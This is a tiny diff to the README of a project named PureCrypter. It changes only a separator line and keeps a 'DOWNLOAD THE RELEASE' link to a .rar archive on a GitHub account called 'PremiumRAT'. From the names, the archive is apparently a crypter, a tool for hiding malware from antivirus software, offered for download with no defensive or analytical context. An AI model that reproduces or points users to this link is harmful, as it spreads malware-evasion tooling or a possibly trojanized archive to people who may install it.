@@ -1,6 +1,6 @@
 # PureCrypter
 ---------------------
----------------------
+----------------------
 
 DOWNLOAD THE RELEASE : https://github.com/PremiumRAT/PureCrypter/releases/download/release/PureCrypter.rar
 ---------------------------
